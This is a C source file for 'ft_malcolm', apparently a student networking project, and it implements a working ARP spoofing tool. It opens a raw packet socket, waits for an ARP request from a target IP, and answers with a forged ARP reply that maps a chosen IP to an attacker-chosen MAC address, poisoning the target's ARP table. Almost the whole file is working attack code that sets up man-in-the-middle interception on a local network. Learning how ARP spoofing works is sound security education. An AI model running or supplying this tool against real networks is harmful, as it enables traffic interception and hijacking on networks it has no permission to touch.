#include "../includes/ft_malcolm.h"

t_data g_data;

void free_data(void) {
    if (g_data.sockfd != -1)
        close(g_data.sockfd);
    if (g_data.result_src != NULL)
        freeaddrinfo(g_data.result_src);
    if (g_data.result_target != NULL)
        freeaddrinfo(g_data.result_target);
}

void signal_handler(int signal) {
    if (signal == SIGINT) {
        printf("Exiting program...\n");
        free_data();
        exit(EXIT_SUCCESS);
    }
}

int     init_socket(void)
{
	int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ARP_TYPE));
	if (sockfd == -1)
		exit_error("ft_malcolm: socket error");
	return (sockfd);
}

int  get_interface(void) {
    struct ifaddrs      *ifap = NULL, *head = NULL;
    if (getifaddrs(&ifap) == -1)
        exit_error("ft_malcolm: no such interface");
    head = ifap;
    for ( ; ifap != NULL ; ifap = ifap->ifa_next) {
        if (ifap->ifa_name && ft_strncmp(ifap->ifa_name, INTERFACE, sizeof(INTERFACE)) == 0) {
            printf("Found available interface: %s\n", ifap->ifa_name);
            if (ifap->ifa_addr->sa_family == AF_PACKET) {
                struct sockaddr_ll *s = (struct sockaddr_ll *)ifap->ifa_addr;
                int ifindex = s->sll_ifindex;
                freeifaddrs(head);
                return (ifindex);
            }
        }
    }
    freeifaddrs(head);
    fprintf(stderr, "ft_malcolm: interface not found");
    return exit_error(""), -1;
}

void create_socket_address(struct sockaddr_ll *socket_address, uint8_t *mac_target, int ifindex) {
    ft_memset(socket_address, 0, sizeof(struct sockaddr_ll));
    socket_address->sll_family = AF_PACKET;
    socket_address->sll_protocol = htons(ETH_P_ARP);
    socket_address->sll_ifindex = ifindex;
    socket_address->sll_hatype = htons(ARPHRD_ETHER);
    socket_address->sll_pkttype = PACKET_BROADCAST;
    socket_address->sll_halen = ETH_ALEN;
    memcpy(socket_address->sll_addr, mac_target, ETH_ALEN);
    socket_address->sll_addr[6] = 0x00;
    socket_address->sll_addr[7] = 0x00;
}

void create_arp_packet(t_arp_packet *packet, char **argv) {
    ft_memset(packet, 0, sizeof(t_arp_packet));

    // Ethernet header
    memcpy(packet->h_target, g_data.mac_target, ETH_ALEN);
    memcpy(packet->h_src, g_data.mac_src, ETH_ALEN);
    packet->h_proto = htons(ETH_P_ARP);

    // ARP header
    packet->hardware_type = htons(ETHERNET_10MB);
    packet->proto_type = htons(IPV4_TYPE);
    packet->hardware_addr_len = ETH_ALEN;
    packet->proto_addr_len = IP_ADDR_LEN; 
    packet->operation = htons(REPLY);

    if (!inet_pton(AF_INET, argv[IP_SRC], &packet->ip_src) ||
        !inet_pton(AF_INET, argv[IP_TARGET], &packet->ip_target)) {
        exit_error("Invalid IP address format");
    }
    memcpy(packet->mac_src, g_data.mac_src, ETH_ALEN);
    memcpy(packet->mac_target, g_data.mac_target, ETH_ALEN);
}

_Bool receive_arp_request() {
    t_arp_packet recv_packet;
    struct sockaddr_ll recv_addr;
    socklen_t addr_len = sizeof(recv_addr);

    ssize_t bytes_received = recvfrom(g_data.sockfd, &recv_packet, sizeof(t_arp_packet), 0,
                                      (struct sockaddr *)&recv_addr, &addr_len);
    if (bytes_received <= 0) {
        perror("recvfrom() failed");
        return 0;
    }

    if (ntohs(recv_packet.operation) == REQUEST &&
        ntohs(recv_packet.proto_type) == IPV4_TYPE &&
        ntohs(recv_packet.hardware_type) == ETHERNET_10MB &&
        memcmp(&recv_packet.ip_src, &g_data.ip_target, sizeof(recv_packet.ip_target)) == 0) {
        printf("Received ARP request for target IP\n");
        return 1;
    }
    return 0;
}

int main(int argc, char **argv) {
    if (getuid() != 0)
        exit_error("ft_malcolm: Operation not permitted");
    if (argc != 5)
        exit_error("ft_malcolm: usage: <IP-src> <MAC-src> <IP-target> <MAC-target>");
    signal(SIGINT, signal_handler);

    parse_mac_address(argv[MAC_SRC]);
    parse_mac_address(argv[MAC_TARGET]);
    for (int i = 0; i < 6; i++) {
        g_data.mac_src[i] = hextouint8(argv[MAC_SRC] + i * 3);
        g_data.mac_target[i] = hextouint8(argv[MAC_TARGET] + i * 3);
    }
    parse_ip_address(argv[IP_SRC], argv[IP_TARGET]);
    g_data.sockfd = init_socket();
    int ifindex = get_interface();

    t_arp_packet packet;
    create_arp_packet(&packet, argv);
    struct sockaddr_ll socket_address;
    create_socket_address(&socket_address, g_data.mac_target, ifindex);
    while (42) {
        if (receive_arp_request()) {
            printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
            ssize_t bytes_sent = sendto(g_data.sockfd, &packet, sizeof(t_arp_packet), 0,
                                (struct sockaddr *)&socket_address, sizeof(struct sockaddr_ll));
            if (bytes_sent <= 0)
                exit_error("ft_malcolm: sendto() failed");
            printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
        }
    }
    free_data();
    return (EXIT_SUCCESS);
}